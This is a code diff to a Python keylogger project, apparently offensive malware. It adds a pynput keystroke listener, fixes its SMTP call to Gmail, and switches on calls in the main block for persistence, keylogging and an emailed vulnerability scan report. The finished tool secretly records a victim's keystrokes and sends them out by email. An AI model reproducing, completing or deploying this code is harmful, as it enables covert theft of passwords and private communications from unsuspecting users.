@@ -1,4 +1,4 @@
-from pynput.keyboard import Key, Controller
+from pynput.keyboard import Key, Listener
 from pynput import keyboard
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
@@ -20,6 +20,9 @@ EMAIL = None # Set email here
 EMAIL_PASSWORD = None # Set email password here
 EMAIL_TO = None # leave this None if you want to send the email to yourself
 SEND_EMAIL_EVERY = None # Send email every integer. 1 meaning 1 minute or 5 meaning 5 minutes
+
+if SEND_EMAIL_EVERY:
+	SEND_EMAIL_EVERY *= 60
 
 
 class Firefox:
@@ -301,7 +304,7 @@ class Keylogger(VulnScan):
 	def send_email(self, message):
 		server = smtplib.SMTP("smtp.gmail.com", 587)
 		server.ehlo()
-		server.stattls()
+		server.starttls()
 		verify = False
 
 		try:
@@ -317,11 +320,16 @@ class Keylogger(VulnScan):
 				server.sendmail(EMAIL, EMAIL, message)
 		return
 
+	def start_keylogger(self):
+		listener = Listener(on_press=self.on_press)
+		self.report_logs()
+		listener.start()
+
 if __name__ == '__main__':
 	if not EMAIL or not EMAIL_PASSWORD or not SEND_EMAIL_EVERY:
 		print("[-] Must set the Variables required to run program")
 		exit()
-	pass
 
-	#VulnScan().vuln_scanner_email_report()
-	#Keylogger()
+	VulnScan().vuln_scanner_email_report()
+	Keylogger().persistence()
+	Keylogger().start_keylogger()
